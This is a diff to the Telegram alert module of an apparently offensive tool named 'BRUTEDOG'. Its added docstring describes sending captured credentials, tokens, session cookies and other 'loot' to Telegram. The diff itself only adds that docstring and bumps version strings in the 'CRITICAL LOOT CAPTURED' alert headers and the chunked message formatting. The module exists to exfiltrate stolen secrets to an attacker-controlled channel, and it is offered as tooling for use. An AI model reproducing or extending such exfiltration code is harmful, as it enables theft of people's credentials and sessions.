@@ -1,3 +1,11 @@
+#!/usr/bin/env python3
+"""
+TELEGRAM_NOTIFIER.PY v8.7 — Centralized Offensive Telemetry & Alert Dispatcher (Elite Red Team Adversarial Edition)
+Features:
+- Asynchronously dispatches captured credentials, tokens, session cookies, and loot to Telegram
+- Automatic HTML escaping and safe chunking for payloads exceeding Telegram's length limit
+- Resilient non-blocking exception handling to keep core exploitation threads uninterrupted
+"""
 import os
 import asyncio
 import httpx
@@ -35,7 +43,7 @@ async def send_telegram_alert(loot_type: str, details: Union[dict, str]):
         details_str = f"<code>{_escape_html(details)}</code>"
 
     base_header = (
-        f"🚨 <b>BRUTEDOG V8.0 — CRITICAL LOOT CAPTURED</b> 🚨\n"
+        f"🚨 <b>BRUTEDOG V8.7 — CRITICAL LOOT CAPTURED</b> 🚨\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🎯 <b>Vector:</b> <code>{_escape_html(loot_type.upper())}</code>\n\n"
     )
@@ -51,7 +59,7 @@ async def send_telegram_alert(loot_type: str, details: Union[dict, str]):
         chunks = [details_str[i:i+max_chunk_size] for i in range(0, len(details_str), max_chunk_size)]
         for idx, chunk in enumerate(chunks, 1):
             messages.append(
-                f"🚨 <b>BRUTEDOG V8.0 [Part {idx}/{len(chunks)}]</b> 🚨\n"
+                f"🚨 <b>BRUTEDOG V8.7 [Part {idx}/{len(chunks)}]</b> 🚨\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"🎯 <b>Vector:</b> <code>{_escape_html(loot_type.upper())}</code>\n\n"
                 f"{chunk}\n"
